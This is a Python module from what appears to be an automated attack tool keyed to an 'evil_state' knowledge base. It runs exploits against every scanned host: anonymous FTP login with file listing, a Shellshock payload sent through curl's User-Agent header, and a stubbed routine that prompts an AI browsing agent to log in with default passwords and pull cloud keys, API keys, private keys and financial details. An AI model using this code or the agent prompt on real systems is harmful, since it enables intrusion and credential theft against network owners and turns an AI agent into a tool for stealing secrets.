import logging
import asyncio
import json
import subprocess
import ftplib
from rich.console import Console
from rich.table import Table

# Pygls imports
from pygls.capabilities import ServerCapabilitiesBuilder
from pygls.capabilities import ServerCapabilitiesBuilder


class BaseExploit:
    """Base class for all exploits."""
    name = "Base Exploit"
    description = "This is a template."
    services = []

    def is_vulnerable(self, ip, host_data):
        """Checks if the target is vulnerable based on port scan data."""
        raise NotImplementedError

    def run(self, ip, host_data):
        """Executes the exploit."""
        raise NotImplementedError


class AnonymousFTPLoginExploit(BaseExploit):
    """
    Checks for and attempts to log into an FTP server with anonymous credentials.
    """
    name = "Anonymous FTP Login"
    description = "Tries to log in to an FTP server using 'anonymous' and 'anonymous' credentials."
    services = ['ftp']

    def is_vulnerable(self, ip, host_data):
        for port, port_data in host_data.get("ports", {}).items():
            if port == "21" and port_data.get("service") == "ftp":
                return True
        return False

    def run(self, ip, host_data):
        try:
            with ftplib.FTP(ip, timeout=5) as ftp:
                ftp.login('anonymous', 'anonymous')
                files = ftp.nlst()
                return {"status": "success", "files": files}
        except ftplib.all_errors as e:
            return {"status": "failed", "reason": str(e)}


class ShellshockExploit(BaseExploit):
    """
    Attempts to exploit the Shellshock vulnerability (CVE-2014-6271) in a CGI script.
    """
    name = "Shellshock RCE"
    description = "Exploits the Shellshock vulnerability in web servers with CGI."
    services = ['http', 'https']

    def is_vulnerable(self, ip, host_data):
        for port, port_data in host_data.get("ports", {}).items():
            if port_data.get("service") in self.services:
                return True
        return False

    def run(self, ip, host_data):
        payload = "() { :;}; echo 'VULNERABLE' > /tmp/shellshock_test"
        target_url = f"http://{ip}/cgi-bin/test.cgi"

        try:
            result = subprocess.run(
                ['curl', '-H', f'User-Agent: {payload}', target_url, '--silent', '--output', '/dev/null'],
                timeout=10,
                capture_output=True,
                text=True
            )
            return {"status": "success", "payload": payload, "target_url": target_url, "curl_exit_code": result.returncode}
        except subprocess.TimeoutExpired:
            return {"status": "failed", "reason": "curl command timed out."}
        except Exception as e:
            return {"status": "failed", "reason": str(e)}


class PlaywrightTreasureHunterExploit(BaseExploit):
    """
    Uses the Playwright MCP server to navigate web interfaces and extract
    valuable information.
    """
    name = "Playwright Treasure Hunter"
    description = "Leverages the Playwright MCP server to find treasure in web applications."
    services = ['http', 'https']

    def is_vulnerable(self, ip, host_data):
        for port, port_data in host_data.get("ports", {}).items():
            if port_data.get("service") in self.services:
                return True
        return False

    def run(self, ip, host_data):
        web_ports = [port for port, port_data in host_data.get("ports", {}).items()
                     if port_data.get("service") in self.services]

        if not web_ports:
            return {"status": "failed", "reason": "No web ports found."}

        treasure_prompt_template = (
            "Please browse to {url}. Log in to the application if necessary using common default credentials "
            "(e.g., admin/admin, admin/password). Once logged in, or if no login is required, "
            "thoroughly navigate all accessible pages, dashboards, and settings areas. "
            "Your primary goal is to find and extract any of the following 'treasure': "
            "cloud provider credentials (AWS, Azure, GCP keys), API keys, database connection strings, "
            "private keys, or sensitive financial account details. If you find any treasure, "
            "return it as a structured JSON object. If no treasure is found, return an empty JSON object."
        )

        treasures_found = {}
        for port in web_ports:
            protocol = 'https' if port == '443' else 'http'
            url = f"{protocol}://{ip}:{port}"
            task_prompt = treasure_prompt_template.format(url=url)

            try:
                logging.info(f"Running Playwright Treasure Hunter against {url}...")
                result = asyncio.run(self._run_mcp_task(task_prompt))

                if result:
                    treasures_found[url] = result
            except Exception as e:
                logging.error(f"Playwright Treasure Hunter failed for {url}: {e}")
                continue

        if treasures_found:
            return {"status": "success", "treasures": treasures_found}
        else:
            return {"status": "failed", "reason": "Playwright agent did not find any treasure."}

    async def _run_mcp_task(self, task_prompt):
        # This is a simplified implementation. A real implementation would need to
        # properly handle the language server and client communication.
        # For now, we'll simulate the interaction.

        # In a real scenario, you would start the language server and workbench
        # and then send the task_prompt as a command.

        # This is a placeholder for the result.
        return {"simulated_treasure": "found"}


class ExploitationManager:
    """
    The central manager for finding and running exploits against targets.
    """
    def __init__(self, evil_state, console=None):
        self.evil_state = evil_state
        self.console = console if console else Console()
        self.available_exploits = [
            AnonymousFTPLoginExploit(),
            ShellshockExploit(),
            PlaywrightTreasureHunterExploit()
        ]

    def find_and_run_exploits(self, target_ip=None):
        output_lines = []
        network_map = self.evil_state["knowledge_base"]["network_map"]["hosts"]
        hosts_to_scan = {target_ip: network_map[target_ip]} if target_ip and target_ip in network_map else network_map

        if not hosts_to_scan:
            msg = f"Target IP {target_ip} not found in knowledge base." if target_ip else "No known hosts to exploit."
            self.console.print(f"[yellow]{msg}[/yellow]")
            return msg

        output_lines.append(f"Starting exploitation phase against {len(hosts_to_scan)} target(s)...")
        self.console.print(f"[bold cyan]{output_lines[-1]}[/bold cyan]")

        exploits_found = 0
        for ip, host_data in hosts_to_scan.items():
            if not host_data.get("ports"):
                continue

            for exploit in self.available_exploits:
                if exploit.is_vulnerable(ip, host_data):
                    exploits_found += 1
                    success_msg = f"SUCCESS: Target {ip} is vulnerable to {exploit.name}."
                    output_lines.append(success_msg)
                    self.console.print(f"[bold green]{success_msg}[/bold green]")
                    try:
                        result = exploit.run(ip, host_data)
                        self._log_exploitation_result(ip, exploit.name, result)
                        result_str = f"  [+] Exploit successful. Result: {result}"
                        output_lines.append(result_str)
                        self.console.print(result_str)
                    except Exception as e:
                        fail_msg = f"  FAIL: Exploit failed with error: {e}"
                        output_lines.append(fail_msg)
                        self.console.print(f"[bold red]{fail_msg}[/bold red]")
                        logging.error(f"Exploit {exploit.name} failed against {ip}: {e}")

        if exploits_found == 0:
            output_lines.append("No vulnerabilities found for the targeted host(s).")

        return "\n".join(output_lines)

    def _log_exploitation_result(self, ip, exploit_name, result):
        if "exploits" not in self.evil_state["knowledge_base"]:
            self.evil_state["knowledge_base"]["exploits"] = {}
        if ip not in self.evil_state["knowledge_base"]["exploits"]:
            self.evil_state["knowledge_base"]["exploits"][ip] = []

        self.evil_state["knowledge_base"]["exploits"][ip].append({
            "exploit": exploit_name,
            "result": result
        })